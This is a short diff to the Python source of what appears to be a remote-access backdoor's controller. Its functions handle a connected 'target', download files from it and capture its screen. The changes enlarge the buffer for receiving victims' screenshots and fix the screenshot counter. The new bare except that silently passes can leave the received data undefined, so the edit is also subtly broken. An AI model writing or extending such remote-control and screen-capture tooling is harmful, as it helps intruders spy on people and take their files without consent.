@@ -55,11 +55,15 @@ def screenshot(target, count):
         os.makedirs(directory)
     f = open(directory + '/screenshot_%d.png' % (count), 'wb')  # if target=Linux then #apt-get install scrot
     target.settimeout(3)
-    chunk = target.recv(1024)
+    try:
+        chunk = target.recv(10485760)  # 10MB
+    except:
+        pass
+
     while chunk:
         f.write(chunk)
         try:
-            chunk = target.recv(1024)
+            chunk = target.recv(10485760)
         except socket.timeout as e:
             break
     target.settimeout(None)
@@ -134,6 +138,7 @@ def target_communication(target, ip):
             download_file(target, command[9:])
         elif command[:10] == 'screenshot':
             screenshot(target, count)
+            count = count + 1
         elif command == 'help':
             server_help_manual()
         else:
